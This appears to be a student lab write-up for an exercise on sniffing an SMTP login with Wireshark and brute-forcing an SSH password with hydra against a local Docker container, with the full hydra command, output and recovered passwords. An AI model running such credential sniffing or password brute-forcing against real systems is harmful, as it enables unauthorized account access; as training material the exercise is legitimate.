# attack_is_the_best_defense

## Task 0

- Just use wireshark with filter tcp.port = 587
- Start listenening and execute the script `user_authenticating_into_server`
- Check the command line packets or search for password key word
- The base64 password is `bXlwYXNzd29yZDk4OTgh7` use any online base64 encode/decode tool to get the password `mypassword9898!`

## Task 1

- Use hydra tool to bruteforce the ssh account password for the user `sylvain`
- The docker image `sylvainkalache/264-1`
- Find your own passwords dictionary online, I used [this one](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt)

```sh
docker run -p 2222:22 --name my_server -d -ti sylvainkalache/264-1
```

- I used the `hydra-wizard` tool to build my command according to my case

```sh
$ hydra -l sylvain -P 2020-200_most_used_passwords.txt -u  -s 2222  0.0.0.0:2222 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-31 23:04:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 197 login tries (l:1/p:197), ~13 tries per task
[DATA] attacking ssh://0.0.0.0:2222/
[2222][ssh] host: 0.0.0.0   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 9 final worker threads did not complete until end.
[ERROR] 9 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-31 23:05:34
```

The password is `password123`
